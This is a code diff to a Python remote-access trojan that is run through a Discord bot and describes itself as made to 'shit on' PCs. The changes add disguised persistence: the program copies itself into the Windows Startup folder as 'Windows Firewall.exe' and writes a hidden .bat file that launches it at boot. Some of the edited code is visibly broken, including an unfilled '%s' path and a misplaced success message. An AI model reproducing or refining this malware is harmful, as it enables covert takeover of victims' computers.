@@ -18,6 +18,7 @@ import re
 import sys
 import shutil
 import pyautogui
+import getpass
 
 from urllib.request import urlopen, urlretrieve
 from time import sleep
@@ -37,8 +38,18 @@ from discord_slash.utils.manage_components import create_button, create_actionro
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\'s')
 slash = SlashCommand(client, sync_commands=True)
 
+
+#//////////////////
+
 token = 'BOT_TOKE_HERE' #bot token that will you will control their pc thru
-g = [GUILD_ID_HERE] #guild id that the slash commands get registered on
+g = [] #guild id that the slash commands get registered on
+
+myname = str(sys.argv[0])
+FakeFileName = "Windows Firewall"
+USER_NAME = getpass.getuser()
+
+#/////////////////
+
 
 @client.event
 async def on_slash_command_error(ctx, error):
@@ -572,18 +583,20 @@ async def AdminForce_command(ctx: SlashContext):
 
 
 @slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
-async def Startup_command(ctx: SlashContext, reg_name: str):
+async def Startup_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        try:
-            key1 = winreg.HKEY_CURRENT_USER
-            key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-            open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
-
-            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
-            open_.Close()
-            await ctx.send("Successfully added it to `run` startup")
-        except PermissionError:
-            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
-            await ctx.send("Permission was denied, added it to `startup folder` instead")
+            try:
+                shutil.copy2(myname, fr'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{FakeFileName}.exe' % USER_NAME)
+                file_path = myname
+                if file_path == "":
+                    file_path = os.path.dirname(os.path.realpath(__file__))
+                bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+                with open(bat_path + '\\' + f"{FakeFileName}.bat", "w+") as bat_file:
+                    bat_file.write(fr'start "" "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{FakeFileName}.exe"')
+                    win32api.SetFileAttributes(fr"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{FakeFileName}.bat", win32con.FILE_ATTRIBUTE_HIDDEN)
+                    bat_file.close()
+            except Exception as e:
+                print(e)
+                await ctx.send("Now running on next computer startup.")
 
 client.run(token)
